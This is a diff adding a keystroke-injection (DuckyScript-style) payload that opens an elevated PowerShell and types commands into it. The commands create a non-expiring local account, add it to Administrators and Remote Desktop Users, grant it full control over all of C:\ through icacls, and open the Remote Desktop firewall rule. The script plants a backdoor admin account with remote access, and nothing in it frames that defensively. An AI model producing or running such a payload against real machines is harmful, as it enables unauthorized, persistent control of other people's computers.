@@ -1,0 +1,48 @@
+REM Start PowerShell
+GUI r
+STRING powershell
+ENTER
+
+REM Check if the script is running with admin rights
+STRING if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-verb RunAs"; exit }
+ENTER
+
+REM Prompt for Username and Password
+STRING $username = Read-Host 'Enter new username:'
+ENTER
+STRING $password = Read-Host 'Enter password:' -AsSecureString
+ENTER
+
+REM Create the User and Set Initial Properties
+STRING New-LocalUser -Name $username -Password $password -FullName "$username (Admin)" -AccountNeverExpires $true -UserMayNotChangePassword $true
+ENTER
+
+REM Add the User to the Administrators Group
+STRING Add-LocalGroupMember -Group "Administrators" -Member $username
+ENTER
+
+REM Grant Full Permissions for System Directories (Optional but Risky)
+STRING $path = "C:\"
+ENTER
+STRING icacls $path /grant:r "$username:(F)" /T /C /Q
+ENTER
+
+REM Ensure the User Account is Enabled
+STRING Enable-LocalUser -Name $username
+ENTER
+
+REM Enable Remote Desktop Access (Optional)
+STRING Add-LocalGroupMember -Group "Remote Desktop Users" -Member $username
+ENTER
+
+REM Configure Firewall for Remote Desktop (Optional)
+STRING Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+ENTER
+
+REM Confirm User Creation and Permissions
+STRING Write-Host "User $username has been successfully created and granted administrative privileges."
+ENTER
+
+REM Exit PowerShell
+STRING exit
+ENTER
